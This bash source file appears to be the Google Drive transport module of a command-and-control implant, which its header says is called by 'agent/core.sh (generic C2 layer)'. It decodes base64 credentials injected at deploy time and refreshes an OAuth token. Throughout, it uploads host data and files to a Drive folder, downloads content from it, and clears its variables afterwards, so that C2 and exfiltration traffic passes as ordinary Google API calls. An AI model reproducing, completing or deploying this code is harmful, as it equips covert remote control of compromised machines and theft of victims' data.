# === TRANSPORT: Google Drive API v3 ===
# Provider-specific: token refresh, upload, download, delete.
# Paths are resolved hierarchically within the root FOLDER_ID.
# Functions called by agent/core.sh (generic C2 layer).
# Credentials are base64 placeholders substituted by the wizard at deploy time.

_TOKEN=""
_CI=$(echo "PLACEHOLDER_CLIENT_ID_B64"     | base64 -d)
_CS=$(echo "PLACEHOLDER_CLIENT_SECRET_B64"  | base64 -d)
_RT=$(echo "PLACEHOLDER_REFRESH_TOKEN_B64"  | base64 -d)
_FI=$(echo "PLACEHOLDER_FOLDER_ID_B64"      | base64 -d)
_GD_FILES="https://www.googleapis.com/drive/v3/files"
_GD_UPLOAD="https://www.googleapis.com/upload/drive/v3/files"
declare -A _GD_FOLDER_CACHE 2>/dev/null || true  # bash 4+; graceful no-op on older

_token_refresh() {
    log "[TOKEN]: Refreshing Google OAuth2 access token..."
    local _resp _new
    _resp=$(curl -s --connect-timeout 10 --max-time 30 -X POST \
        "https://oauth2.googleapis.com/token" \
        -d "grant_type=refresh_token&refresh_token=${_RT}&client_id=${_CI}&client_secret=${_CS}")
    _new=$(printf '%s' "$_resp" | sed -n 's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
    if [ -n "$_new" ]; then
        _TOKEN="$_new"
        log "[TOKEN]: [OK] Token updated"
        return 0
    fi
    log "[TOKEN]: [X] Refresh ERROR"
    return 1
}

# _gd_resolve_folder PATH_PREFIX — walk/create subfolders, echo leaf folder ID.
# PATH_PREFIX is the directory part of the path (e.g. /Machine1 or /a/b).
# Returns _FI unchanged when PATH_PREFIX is empty or "/".
_gd_resolve_folder() {
    local _prefix="$1" _parent="$_FI" _part _q _resp _fid _cache_key
    # Strip leading/trailing slashes and split on /
    _prefix=$(printf '%s' "$_prefix" | sed 's|^/||;s|/$||')
    [ -z "$_prefix" ] && { printf '%s' "$_FI"; return; }
    local IFS='/'
    for _part in $_prefix; do
        [ -z "$_part" ] && continue
        _cache_key="${_parent}/${_part}"
        # Check associative array cache (bash 4+) or skip
        if declare -p _GD_FOLDER_CACHE >/dev/null 2>&1; then
            _fid="${_GD_FOLDER_CACHE[$_cache_key]:-}"
            [ -n "$_fid" ] && { _parent="$_fid"; continue; }
        fi
        _q="name%3D%27${_part}%27+and+%27${_parent}%27+in+parents+and+mimeType%3D%27application%2Fvnd.google-apps.folder%27+and+trashed%3Dfalse"
        _resp=$(curl -s --connect-timeout 10 --max-time 15 \
            "${_GD_FILES}?q=${_q}&fields=files%28id%29" \
            --header "Authorization: Bearer $_TOKEN")
        _fid=$(printf '%s' "$_resp" | sed -n 's/.*"id"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -1)
        if [ -z "$_fid" ]; then
            # Create the subfolder
            _resp=$(curl -s --connect-timeout 10 --max-time 15 -X POST \
                "$_GD_FILES" \
                --header "Authorization: Bearer $_TOKEN" \
                --header "Content-Type: application/json" \
                --data "{\"name\":\"${_part}\",\"mimeType\":\"application/vnd.google-apps.folder\",\"parents\":[\"${_parent}\"]}")
            _fid=$(printf '%s' "$_resp" | sed -n 's/.*"id"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -1)
        fi
        [ -z "$_fid" ] && { printf '%s' "$_parent"; return; }
        if declare -p _GD_FOLDER_CACHE >/dev/null 2>&1; then
            _GD_FOLDER_CACHE[$_cache_key]="$_fid"
        fi
        _parent="$_fid"
    done
    printf '%s' "$_parent"
}

# _gd_file_id FILENAME PARENT_ID — print file ID, empty if not found
_gd_file_id() {
    local _name="$1" _pid="$2" _q _resp
    _q="name%3D%27${_name}%27+and+%27${_pid}%27+in+parents+and+trashed%3Dfalse"
    _resp=$(curl -s --connect-timeout 10 --max-time 15 \
        "${_GD_FILES}?q=${_q}&fields=files%28id%29" \
        --header "Authorization: Bearer $_TOKEN")
    printf '%s' "$_resp" | sed -n 's/.*"id"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -1
}

# _gd_split_path PATH — sets _gd_dir and _gd_base
_gd_split_path() {
    _gd_dir=$(printf '%s' "$1" | sed 's|/[^/]*$||')
    _gd_base="${1##*/}"
    [ "$_gd_dir" = "$_gd_base" ] && _gd_dir=""   # no slash found
}

_upload() {
    local _path="$1" _data _fid _pid _boundary _meta _resp
    _data=$(cat)
    _gd_split_path "$_path"
    _pid=$(_gd_resolve_folder "$_gd_dir")
    _fid=$(_gd_file_id "$_gd_base" "$_pid")
    if [ -n "$_fid" ]; then
        _resp=$(printf '%s' "$_data" | curl -s --connect-timeout 10 --max-time 30 \
            -X PATCH "${_GD_UPLOAD}/${_fid}?uploadType=media" \
            --header "Authorization: Bearer $_TOKEN" \
            --header "Content-Type: application/octet-stream" \
            --data-binary @-)
    else
        _boundary="stratumx7k2"
        _meta="{\"name\":\"${_gd_base}\",\"parents\":[\"${_pid}\"]}"
        _resp=$(printf '%s' "$_data" | \
            { printf -- "--${_boundary}\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n${_meta}\r\n--${_boundary}\r\nContent-Type: application/octet-stream\r\n\r\n"; cat; printf "\r\n--${_boundary}--"; } | \
            curl -s --connect-timeout 10 --max-time 30 \
                -X POST "${_GD_UPLOAD}?uploadType=multipart" \
                --header "Authorization: Bearer $_TOKEN" \
                --header "Content-Type: multipart/related; boundary=${_boundary}" \
                --data-binary @-)
    fi
    if echo "$_resp" | grep -q '"invalid_token"\|"401"'; then
        _token_refresh && printf '%s' "$_data" | _upload "$_path"
    fi
}

_upload_file() {
    local _path="$1" _file="$2" _fid _pid _boundary _meta _resp
    _gd_split_path "$_path"
    _pid=$(_gd_resolve_folder "$_gd_dir")
    _fid=$(_gd_file_id "$_gd_base" "$_pid")
    if [ -n "$_fid" ]; then
        _resp=$(curl -s --connect-timeout 10 --max-time 60 \
            -X PATCH "${_GD_UPLOAD}/${_fid}?uploadType=media" \
            --header "Authorization: Bearer $_TOKEN" \
            --header "Content-Type: application/octet-stream" \
            --data-binary @"${_file}")
    else
        _boundary="stratumx7k2"
        _meta="{\"name\":\"${_gd_base}\",\"parents\":[\"${_pid}\"]}"
        _resp=$({ printf -- "--${_boundary}\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n${_meta}\r\n--${_boundary}\r\nContent-Type: application/octet-stream\r\n\r\n"; cat "${_file}"; printf "\r\n--${_boundary}--"; } | \
            curl -s --connect-timeout 10 --max-time 60 \
                -X POST "${_GD_UPLOAD}?uploadType=multipart" \
                --header "Authorization: Bearer $_TOKEN" \
                --header "Content-Type: multipart/related; boundary=${_boundary}" \
                --data-binary @-)
    fi
    if echo "$_resp" | grep -q '"invalid_token"\|"401"'; then
        _token_refresh && _upload_file "$_path" "$_file"
        return
    fi
    echo "$_resp" | grep -q '"id"'
}

_download() {
    local _path="$1" _fid _pid _resp
    _gd_split_path "$_path"
    _pid=$(_gd_resolve_folder "$_gd_dir")
    _fid=$(_gd_file_id "$_gd_base" "$_pid")
    [ -z "$_fid" ] && return
    _resp=$(curl -s --connect-timeout 10 --max-time 30 \
        "${_GD_FILES}/${_fid}?alt=media" \
        --header "Authorization: Bearer $_TOKEN" | tr -d '\000')
    if echo "$_resp" | grep -q '"invalid_token"\|"401"'; then
        _token_refresh
        _pid=$(_gd_resolve_folder "$_gd_dir")
        _fid=$(_gd_file_id "$_gd_base" "$_pid")
        [ -z "$_fid" ] && return
        _resp=$(curl -s --connect-timeout 10 --max-time 30 \
            "${_GD_FILES}/${_fid}?alt=media" \
            --header "Authorization: Bearer $_TOKEN" | tr -d '\000')
    fi
    printf '%s' "$_resp"
}

_transport_cleanup() {
    unset _TOKEN _CI _CS _RT _FI _GD_FILES _GD_UPLOAD _gd_dir _gd_base
    unset _GD_FOLDER_CACHE 2>/dev/null || true
}
